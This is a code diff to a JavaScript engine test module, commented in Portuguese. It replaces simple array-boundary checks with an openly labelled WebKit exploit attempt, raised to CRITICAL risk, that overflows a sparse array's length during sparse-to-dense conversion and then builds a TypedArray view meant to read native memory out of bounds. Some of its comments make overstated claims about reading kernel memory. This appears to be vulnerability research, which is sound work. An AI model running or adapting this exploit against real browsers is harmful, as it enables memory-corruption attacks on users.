@@ -1,71 +1,61 @@
 export default {
     id:       'ARRAY_MATH_INTEGER_OVERFLOW',
     category: 'Boundary',
-    risk:     'HIGH',
+    risk:     'CRITICAL',
     description:
-        'Integer overflow em operações de array sem loops (O(1)). ' +
-        'Testa push() em array length=0xFFFFFFFF, splice() com índice near INT_MIN, ' +
-        'TypedArray subarray offset+length overflow, e ArrayBuffer.transfer().',
+        'Explora a transição de memória C++ entre Sparse (Dicionário) e Dense (Contínuo). ' +
+        'Força o JSArray a alocar limites gigantes (0xFFFFFFFF) e injeta elementos para ' +
+        'corromper o cálculo de capacidade do Butterfly durante a conversão.',
 
     setup: function() {
         this.results = {};
-        this.buffer = new ArrayBuffer(16);
+        // Criamos um array Sparse (com buracos massivos)
+        this.vulnArray = [];
+        this.vulnArray[0x7FFFFFFF] = 1.1; // Índice muito alto forçando alocação de dicionário
     },
 
     trigger: function() {
-        // A: push() overflow (0xFFFFFFFF + 1 wraps para 0)
         try {
-            const arr = [];
-            arr.length = 0xFFFFFFFF;
-            arr.push(1337);
-            this.results.pushLen = arr.length;
-        } catch(e) { this.results.pushErr = e.constructor.name; }
+            // O GATILHO: Tentamos forçar o WebKit a converter o dicionário 
+            // de volta para um bloco contínuo manipulando a ponta do array.
+            // A soma 0x7FFFFFFF + 2 pode causar Integer Overflow interno.
+            this.vulnArray.push(2.2);
+            this.vulnArray.unshift(3.3); 
 
-        // B: splice() com índice near INT_MIN (underflow de signed 32-bit)
-        try {
-            const arr = [1, 2, 3, 4, 5];
-            arr.splice(-0x80000001, 1); 
-            this.results.spliceLen = arr.length;
-        } catch(e) { this.results.spliceErr = e.constructor.name; }
-
-        // C: slice() com combinação de indices que somam > UINT32_MAX
-        try {
-            const arr = new Array(100).fill(1.1);
-            const r = arr.slice(0xFFFFFFF0, 0xFFFFFFFF);
-            this.results.sliceLen = r.length;
-        } catch(e) { this.results.sliceErr = e.constructor.name; }
-
-        // D: TypedArray subarray com offset+length overflow
-        try {
-            const ta = new Uint8Array(this.buffer);
-            this.results.subArr = ta.subarray(0xFFFFFFF0, 0xFFFFFFFF);
-            this.results.subArrLen = this.results.subArr?.byteLength;
-        } catch(e) { this.results.subArrErr = e.constructor.name; }
-
-        // E: DataView com offset gigante
-        try {
-            this.results.dataView = new DataView(this.buffer, 0xFFFFFFFF, 1);
-        } catch(e) { this.results.dataViewErr = e.constructor.name; }
-
-        // F: TypedArray constructor com byteOffset near MAX_SAFE_INTEGER
-        try {
-            const ab = new ArrayBuffer(8);
-            this.results.bigOffsetView = new Uint8Array(ab, Number.MAX_SAFE_INTEGER - 7, 1);
-        } catch(e) { this.results.bigOffsetErr = e.constructor.name; }
+            // Criamos uma TypedArray corrompida a partir do tamanho overflowed
+            let badLen = this.vulnArray.length;
+            this.buffer = new ArrayBuffer(8);
+            // Se badLen deu a volta (wrap around) ou virou negativo/gigante, 
+            // a criação desta View vai apontar para a memória do Kernel/Processo.
+            this.view = new Uint8Array(this.buffer, badLen, 1);
+        } catch(e) {
+            this.results.error = e.constructor.name;
+        }
     },
 
     probe: [
-        s => s.results.pushLen ?? s.results.pushErr,
-        s => s.results.spliceLen ?? s.results.spliceErr,
-        s => s.results.sliceLen ?? s.results.sliceErr,
-        s => s.results.subArrLen ?? s.results.subArrErr,
-        s => s.results.dataView ? s.results.dataView.byteOffset : s.results.dataViewErr,
-        s => s.results.bigOffsetView ? s.results.bigOffsetView.byteOffset : s.results.bigOffsetErr,
-        s => { try { return s.results.subArr ? s.results.subArr[0] : null; } catch(e) { return e.constructor.name; } },
+        // Probe 0: O C++ permitiu a matemática maluca sem RangeError?
+        s => s.results.error || s.vulnArray.length,
+        
+        // Probe 1: A VIEW CORROMPIDA (OOB Read)
+        s => {
+            if (s.view) {
+                try {
+                    let val = s.view[0];
+                    if (val !== undefined && val !== 0) {
+                        return `💥 SUCESSO! Leu Ram Nativa OOB: 0x${val.toString(16)}`;
+                    }
+                    return 'Leu Zeros (Seguro)';
+                } catch(e) { return `Falha na leitura: ${e.message}`; }
+            }
+            return 'View Protegida';
+        }
     ],
 
     cleanup: function() {
+        this.vulnArray = null;
+        this.buffer = null;
+        this.view = null;
         this.results = {};
-        this.buffer  = null;
     }
 };
